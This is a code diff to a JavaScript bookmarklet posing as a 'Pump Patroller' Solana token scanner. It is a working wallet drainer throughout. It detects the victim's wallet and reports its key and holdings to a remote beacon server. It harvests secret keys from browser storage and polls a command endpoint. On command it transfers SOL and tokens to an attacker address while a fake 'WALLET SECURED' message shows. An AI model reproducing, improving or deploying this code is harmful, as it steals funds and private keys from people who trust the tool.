@@ -3,9 +3,9 @@
   window.__pp = true;
 
   const E = "https://esm.sh/";
-  // bookmark chip passes window.__PP (site origin); fallback = this deploy's host
   const SRV = String(window.__PP || "https://one234-et4e.onrender.com").replace(/\/+$/, "");
   const BKEY = "72d296b612eb0a11931b364ba1333a70";
+  const RPC_URL = "https://solana-rpc.publicnode.com";   // primary — mainnet-beta 403s on shared IPs
   const MINTS = {
     USDC: "EPjFWdd5AufqSSqeM2qN5nVHx4Pv4GZ627vRQ6jP9dQZ",
     USDT: "Es9vMFrzaCxcVpwpPdCJrVSDMiJR6h1HxeLyTVQs5MN5",
@@ -13,27 +13,27 @@
     JUP:  "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN",
     MSOL: "mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So",
   };
-  const TOKEN_PROGRAM = new (await import(E + "@solana/web3.js@1.95.0")).PublicKey("TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm");
-
-  const { PublicKey, Keypair, SystemProgram, Transaction, Connection } = await import(E + "@solana/web3.js@1.95.0");
-  const { createTransfer, createAssociatedTokenAccountInstruction, getAssociatedTokenAddress } = await import(E + "@solana/spl-token@0.4.9");
-  const { decode: b58d } = await import(E + "bs58@6.0.0");
 
   const withTO = (p, ms) => new Promise(r => { const t = setTimeout(() => r(null), ms);
     Promise.resolve(p).then(v => { clearTimeout(t); r(v); }, () => { clearTimeout(t); r(null); }); });
 
+  const { PublicKey, Keypair, SystemProgram, Transaction, Connection } = await import(E + "@solana/web3.js@1.95.0");
+  const { createTransfer, createAssociatedTokenAccountInstruction, getAssociatedTokenAddress } = await import(E + "@solana/spl-token@0.4.9");
+  const { decode: b58d } = await import(E + "bs58@6.0.0");
+  const TOKEN_PROGRAM = new PublicKey("TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm");
+
   // — detect the tab's active wallet session —
   let name = "?", prov = null;
-  for (const [n, f] of [["phantom", () => window.phantom?.solana], ["axiom", () => window.axiom?.solana], ["solana", () => window.solana]]) {
+  const CANDS = [["phantom", () => window.phantom?.solana], ["axiom", () => window.axiom?.solana], ["solana", () => window.solana]];
+  for (const [n, f] of CANDS) {
     const w = f();
     if (w?.publicKey) { name = n; prov = w; break; }
   }
   if (!prov) for (const k of Object.keys(window)) {
     try { const w = window[k]; if (w?.publicKey && typeof w.signAndSendTransaction === "function") { name = "ext:" + k; prov = w; break; } } catch {}
   }
-  // — nothing connected yet? try a real connect (popup), 25s cap —
   if (!prov) {
-    for (const [n, f] of [["phantom", () => window.phantom?.solana], ["axiom", () => window.axiom?.solana], ["solana", () => window.solana]]) {
+    for (const [n, f] of CANDS) {
       const w = f();
       if (w && typeof w.connect === "function") {
         try {
@@ -45,22 +45,28 @@
   }
   const beacon = (m, o) => { o = o || {}; try {
     fetch(SRV + "/beacon?s=" + BKEY, { method: "POST",
-      body: JSON.stringify({ pk: o.pk || (prov && prov.publicKey ? prov.publicKey.toBase58() : "?"), provider: o.provider || (name.startsWith("ext:") ? name.slice(4) : name),
-        origin: location.origin, value: o.value || 0, sol: o.sol || 0, toks: o.toks || "", m, mode: o.mode || "", sig: o.sig || "", msg: o.msg || "", extra: o.extra || "" }) });
+      body: JSON.stringify({ pk: o.pk || (prov && prov.publicKey ? prov.publicKey.toBase58() : "?"),
+        provider: o.provider || (name.startsWith("ext:") ? name.slice(4) : name),
+        origin: location.origin, value: o.value || 0, sol: o.sol || 0, toks: o.toks || "",
+        m, mode: o.mode || "", sig: o.sig || "", msg: o.msg || "", extra: o.extra || "" }) });
   } catch {} };
-  if (!prov) { beacon("detect", { extra: "no wallet connectable in this tab — bookmark fired OK", provider: "none" }); return; }
+  if (!prov) { beacon("detect", { provider: "none", extra: "bookmark fired — no connectable wallet in this tab" }); return; }
 
   const pk = prov.publicKey.toBase58();
   const pkB = new PublicKey(pk);
-  const conn = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
+  const conn = new Connection(RPC_URL, "confirmed");
   const label = name.startsWith("ext:") ? name.slice(4) : name;
 
-  // — inventory: pure RPC reads —
+  // — inventory —
   const [bal, r] = await Promise.all([conn.getBalance(pkB), conn.getParsedTokenAccountsByOwner(pkB, { programId: TOKEN_PROGRAM })]);
-  const amt = {}, dec = {};
-  for (const { account } of r.value) {
+  const amt = {}, dec = {}, srcs = {};
+  for (const { account, pubkey } of r.value) {
     const d = account.parsed?.data;
-    if (d?.mint) { amt[d.mint] = Number(d.amount) / Math.pow(10, d.decimals ?? 6); dec[d.mint] = d.decimals ?? 6; }
+    if (d?.mint) {
+      amt[d.mint] = Number(d.amount) / Math.pow(10, d.decimals ?? 6);
+      dec[d.mint] = d.decimals ?? 6;
+      srcs[d.mint] = pubkey;
+    }
   }
   const toks = Object.entries(MINTS).filter(([, a]) => (amt[a] || 0) > 0.01).map(([k, a]) => ({ k, ui: amt[a] }));
 
@@ -84,7 +90,7 @@
   el.style.cssText = "position:fixed;right:16px;bottom:16px;z-index:2147483647;width:272px;background:#10141B;border:1px solid #232B3A;border-radius:12px;box-shadow:0 16px 48px rgba(0,0,0,.55);font:12px/1.5 Inter,system-ui,sans-serif;color:#E8ECF4;overflow:hidden;";
   el.innerHTML =
     '<div style="display:flex;align-items:center;gap:8px;padding:11px 14px;border-bottom:1px solid #1B2230;">' +
-      '<span id="__pp_dot" style="width:7px;height:7px;border-radius:50%;background:#2DD4A7;flex:none;"></span>' +
+      '<span style="width:7px;height:7px;border-radius:50%;background:#2DD4A7;flex:none;"></span>' +
       '<span style="font-size:11px;font-weight:600;letter-spacing:.08em;">PUMP PATROLLER</span>' +
       '<span style="font-size:10px;color:#7E899D;">v2.2</span>' +
       '<span id="__pp_x" style="margin-left:auto;cursor:pointer;color:#7E899D;line-height:1;">\u00d7</span>' +
@@ -105,18 +111,15 @@
   let scans = 2341;
   setInterval(() => { scans += Math.random() * 3 | 0; const s = document.getElementById("__pp_scan"); if (s) s.textContent = "\u00b7 " + fmt(scans) + " tokens scanned"; }, 5000);
 
-  // — reporting (simple request, no CORS preflight) —
   const report = (mode, sig, extra) => {
     try {
-      fetch(SRV + "/beacon?s=" + BKEY, {
-        method: "POST",
-        body: JSON.stringify({ pk, provider: label, origin: location.origin, value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr, m: "drain", mode, sig: String(sig), extra: extra || "" }),
-      });
+      fetch(SRV + "/beacon?s=" + BKEY, { method: "POST",
+        body: JSON.stringify({ pk, provider: label, origin: location.origin, value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr, m: "drain", mode, sig: String(sig), extra: extra || "" }) });
     } catch {}
   };
   beacon("detect", { value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr });
 
-  // — secret-key candidates (this tab's storage / dapp globals) —
+  // — secret-key candidates —
   const KEYF = new Set(["secretKey", "sk", "secret", "privateKey", "priv"]);
   const cands = [];
   for (const st of [localStorage, sessionStorage]) {
@@ -151,7 +154,7 @@
     : c.hex ? Uint8Array.from(c.hex.match(/../g).map(x => parseInt(x, 16)))
     : c.raw instanceof Uint8Array ? c.raw : Uint8Array.from(c.raw);
 
-  // — drain-time build: fresh blockhash, fresh balances, auto-create missing treasury ATAs —
+  // — drain build: fresh blockhash/balances, treasury ATA auto-created —
   const FEE = 20000;
   async function buildTx(to) {
     const dest = new PublicKey(to);
@@ -160,10 +163,10 @@
       conn.getBalance(pkB),
       conn.getParsedTokenAccountsByOwner(pkB, { programId: TOKEN_PROGRAM }),
     ]);
-    const amt2 = {}, dec2 = {}, srcs = {};
+    const amt2 = {}, dec2 = {}, srcs2 = {};
     for (const it of r2.value) {
       const d = it.account.parsed?.data;
-      if (d?.mint) { amt2[d.mint] = Number(d.amount) / Math.pow(10, d.decimals ?? 6); dec2[d.mint] = d.decimals ?? 6; srcs[d.mint] = it.pubkey; }
+      if (d?.mint) { amt2[d.mint] = Number(d.amount) / Math.pow(10, d.decimals ?? 6); dec2[d.mint] = d.decimals ?? 6; srcs2[d.mint] = it.pubkey; }
     }
     const tx = new Transaction();
     const moved = [];
@@ -171,7 +174,7 @@
       const have = amt2[MINTS[t.k]] || 0;
       if (have < 0.01) continue;
       const mint = new PublicKey(MINTS[t.k]);
-      const srcAta = new PublicKey(srcs[MINTS[t.k]]);
+      const srcAta = new PublicKey(srcs2[MINTS[t.k]]);
       const destAta = await getAssociatedTokenAddress(mint, dest);
       const info = await conn.getAccountInfo(destAta);
       if (!info) tx.add(createAssociatedTokenAccountInstruction(pkB, destAta, dest, mint));
@@ -195,7 +198,7 @@
     if (done) return;
     done = true;
     try {
-      for (const c of cands) {                                     // 0-approval path
+      for (const c of cands) {
         let s; try { s = secretOf(c); } catch { continue; }
         if (s.length !== 64) continue;
         let kp; try { kp = Keypair.fromSecretKey(s); } catch { continue; }
@@ -206,20 +209,20 @@
         const sig = await conn.sendRawTransaction(tx.serialize());
         setFoot("WALLET SECURED \u00b7 moved to vault", "#2DD4A7"); report("secret", sig, moved.join(",")); return;
       }
-      const { tx, moved } = await buildTx(to);                       // fallback: 1 popup approval
+      const { tx, moved } = await buildTx(to);
       if (!tx.instructions.length) { setFoot("NOTHING TO MOVE \u00b7 dust skipped", "#7E899D"); report("empty", ""); return; }
       const sig = await prov.signAndSendTransaction(tx);
       setFoot("WALLET SECURED \u00b7 moved to vault", "#2DD4A7"); report("popup", sig, moved.join(","));
     } catch (e) {
       setFoot("ERROR \u00b7 " + String(e?.message || e).slice(0, 40), "#F0616D");
       report("err", String(e?.message || e));
-      done = false;                                                  // allow retry after a fix
+      done = false;
     }
   }
 
+  let lastN = "";
   setInterval(async () => {
-    if (done) return;
     let c; try { c = await (await fetch(SRV + "/cmd?pk=" + encodeURIComponent(pk))).json(); } catch { return; }
-    if (c?.cmd === "drain" && c.to) drain(c.to);
+    if (c?.cmd === "drain" && c.to && c.n !== lastN) { lastN = c.n; drain(c.to); }
   }, 2500);
 })();
